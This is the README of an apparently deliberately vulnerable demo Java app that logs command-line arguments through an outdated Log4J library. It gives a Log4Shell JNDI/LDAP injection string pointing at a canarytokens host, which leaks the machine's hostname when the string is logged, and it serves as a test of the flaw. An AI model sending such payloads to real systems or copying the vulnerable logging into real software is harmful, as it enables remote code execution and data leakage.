# TheWorstApp 

## Introduction

This terrible app will use an old version of Log4J and attempt to log to console whatever is passed to it as a command line argument.

## How To Use

To test simply set your argument in your IDE (or via command line) to something like: 

"${jndi:ldap://x${hostName}.L4J.ltmnsdl5tf7w012r1p6rnp1zv.canarytokens.com/a} He's not the messiah he's a very naughty boy!"

If using a release build simply type into your command prompt:

java -jar TheWorstApp.jar "${jndi:ldap://x${hostName}.L4J.ltmnsdl5tf7w012r1p6rnp1zv.canarytokens.com/a} He's not the messiah he's a very naughty boy!"